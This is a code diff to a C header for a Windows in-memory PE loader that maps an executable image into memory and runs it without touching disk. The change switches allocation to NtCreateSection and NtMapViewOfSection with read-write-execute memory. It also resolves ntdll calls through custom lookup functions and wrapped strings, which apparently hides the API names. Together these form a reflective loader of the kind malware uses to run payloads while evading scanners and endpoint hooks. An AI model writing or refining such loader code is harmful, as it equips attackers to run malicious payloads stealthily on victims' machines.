@@ -5,14 +5,21 @@
 
 // -------------------- Strings --------------------
 STRINGA(ntdll_dll, "ntdll.dll");
-STRINGA(ntallocatevirtualmemory, "NtAllocateVirtualMemory");
+STRINGA(ntcreatesection, "NtCreateSection");
+STRINGA(ntmapviewofsection, "NtMapViewOfSection");
+STRINGA(ntunmapviewofsection, "NtUnmapViewOfSection");
 STRINGA(ntprotectvirtualmemory, "NtProtectVirtualMemory");
-STRINGA(ntfreevirtualmemory, "NtFreeVirtualMemory");
 
 // -------------------- NTDLL typedefs --------------------
-typedef NTSTATUS(NTAPI* NtAllocateVirtualMemory_t)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
+typedef NTSTATUS(NTAPI* NtCreateSection_t)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
+typedef NTSTATUS(NTAPI* NtMapViewOfSection_t)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
+typedef NTSTATUS(NTAPI* NtUnmapViewOfSection_t)(HANDLE, PVOID);
 typedef NTSTATUS(NTAPI* NtProtectVirtualMemory_t)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
-typedef NTSTATUS(NTAPI* NtFreeVirtualMemory_t)(HANDLE, PVOID*, PSIZE_T, ULONG);
+
+typedef enum _SECTION_INHERIT {
+    ViewShare = 1,
+    ViewUnmap = 2
+} SECTION_INHERIT;
 
 // -------------------- Helpers --------------------
 static ULONG SectionProtection(DWORD characteristics) {
@@ -111,25 +118,30 @@ static void ExecuteFromMemory(unsigned char* data) {
 
     HMODULE ntdll = myGetModuleHandleA(ntdll_dll);
 
-    // allocate memory
-    PVOID base = NULL;
-    SIZE_T totalSize = nt->OptionalHeader.SizeOfImage;
-    NtAllocateVirtualMemory_t NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)myGetProcAddress(ntdll, ntallocatevirtualmemory);
-    NtAllocateVirtualMemory((HANDLE)-1, &base, 0, &totalSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    HANDLE section = NULL; 
+    LARGE_INTEGER maxSize; 
+    maxSize.QuadPart = nt->OptionalHeader.SizeOfImage;
 
-    // copy headers
-    for (SIZE_T i = 0; i < nt->OptionalHeader.SizeOfHeaders; i++)
+    NtCreateSection_t NtCreateSection = (NtCreateSection_t)myGetProcAddress(ntdll, ntcreatesection);
+    NtCreateSection(&section, SECTION_ALL_ACCESS, NULL, &maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
+
+    PVOID base = NULL; 
+    SIZE_T viewSize = 0;
+
+    NtMapViewOfSection_t NtMapViewOfSection = (NtMapViewOfSection_t)myGetProcAddress(ntdll, ntmapviewofsection);
+    NtMapViewOfSection(section, (HANDLE)-1, &base, 0, 0, NULL, &viewSize, ViewUnmap, 0, PAGE_EXECUTE_READWRITE);
+
+    for (SIZE_T i = 0; i < nt->OptionalHeader.SizeOfHeaders; i++) 
         ((BYTE*)base)[i] = data[i];
 
-    // copy sections
     for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
-        BYTE* dest = (BYTE*)base + sec[i].VirtualAddress;
-        BYTE* src  = data + sec[i].PointerToRawData;
+        BYTE* dst = (BYTE*)base + sec[i].VirtualAddress;
+        BYTE* src = data + sec[i].PointerToRawData;
         SIZE_T sz = sec[i].SizeOfRawData;
-        while (sz--) *dest++ = *src++;
+        while (sz--) 
+            *dst++ = *src++;
     }
 
-    // apply relocations
     ULONG_PTR delta = (ULONG_PTR)base - nt->OptionalHeader.ImageBase;
     if (delta) {
         IMAGE_DATA_DIRECTORY rl = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
@@ -139,8 +151,8 @@ static void ExecuteFromMemory(unsigned char* data) {
             while ((BYTE*)r < end && r->SizeOfBlock) {
                 WORD* list = (WORD*)(r + 1);
                 DWORD count = (r->SizeOfBlock - sizeof(*r)) / sizeof(WORD);
-                for (DWORD i = 0; i < count; i++)
-                    if ((list[i] >> 12) == IMAGE_REL_BASED_DIR64)
+                for (DWORD i = 0; i < count; i++) 
+                    if ((list[i] >> 12) == IMAGE_REL_BASED_DIR64) 
                         *((ULONG_PTR*)((BYTE*)base + r->VirtualAddress + (list[i] & 0xFFF))) += delta;
                 r = (IMAGE_BASE_RELOCATION*)((BYTE*)r + r->SizeOfBlock);
             }
@@ -149,47 +161,19 @@ static void ExecuteFromMemory(unsigned char* data) {
 
     ResolveImport((BYTE*)base, nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]);
 
-    // protect sections
-    BYTE* regionStart = (BYTE*)base;
-    SIZE_T regionSize = sec[0].VirtualAddress + sec[0].Misc.VirtualSize;
-    ULONG currentProt = SectionProtection(sec[0].Characteristics);
     ULONG oldProt;
-    NtProtectVirtualMemory_t NtProtectVirtualMemory = (NtProtectVirtualMemory_t)myGetProcAddress(ntdll, ntprotectvirtualmemory);
-
-    for (WORD i = 1; i < nt->FileHeader.NumberOfSections; i++, sec++) {
-        ULONG secProt = SectionProtection(sec[i].Characteristics);
-        BYTE* secStart = (BYTE*)base + sec[i].VirtualAddress;
+    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
+        PVOID secBase = (BYTE*)base + sec[i].VirtualAddress;
         SIZE_T secSize = sec[i].Misc.VirtualSize;
-
-        if (secProt == currentProt && regionStart + regionSize == secStart)
-            regionSize += secSize;
-        else {
-            NtProtectVirtualMemory((HANDLE)-1, (PVOID*)&regionStart, &regionSize, currentProt, &oldProt);
-            regionStart = secStart;
-            regionSize = secSize;
-            currentProt = secProt;
-        }
-    }
-    if (regionSize)
-        NtProtectVirtualMemory((HANDLE)-1, (PVOID*)&regionStart, &regionSize, currentProt, &oldProt);
-
-    // free discardable sections
-    sec = IMAGE_FIRST_SECTION(nt);
-    NtFreeVirtualMemory_t NtFreeVirtualMemory = (NtFreeVirtualMemory_t)myGetProcAddress(ntdll, ntfreevirtualmemory);
-    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
-        if (sec[i].Characteristics & IMAGE_SCN_MEM_DISCARDABLE) {
-            PVOID discardBase = (BYTE*)base + sec[i].VirtualAddress;
-            SIZE_T discardSize = sec[i].Misc.VirtualSize;
-            NtFreeVirtualMemory((HANDLE)-1, &discardBase, &discardSize, MEM_DECOMMIT);
-        }
+        ULONG prot = SectionProtection(sec[i].Characteristics);
+        NtProtectVirtualMemory_t NtProtectVirtualMemory = (NtProtectVirtualMemory_t)myGetProcAddress(ntdll, ntprotectvirtualmemory);
+        NtProtectVirtualMemory((HANDLE)-1, &secBase, &secSize, prot, &oldProt);
     }
 
-    // execute entry
-    ((void(*)(void))(base + nt->OptionalHeader.AddressOfEntryPoint))();
+    ((void(*)(void))((BYTE*)base + nt->OptionalHeader.AddressOfEntryPoint))();
 
-    // free image
-    totalSize = nt->OptionalHeader.SizeOfImage;
-    NtFreeVirtualMemory((HANDLE)-1, &base, &totalSize, MEM_RELEASE);
+    NtUnmapViewOfSection_t NtUnmapViewOfSection = (NtUnmapViewOfSection_t)myGetProcAddress(ntdll, ntunmapviewofsection);
+    NtUnmapViewOfSection((HANDLE)-1, base);
 }
 
 #endif // PE_LOADER_H
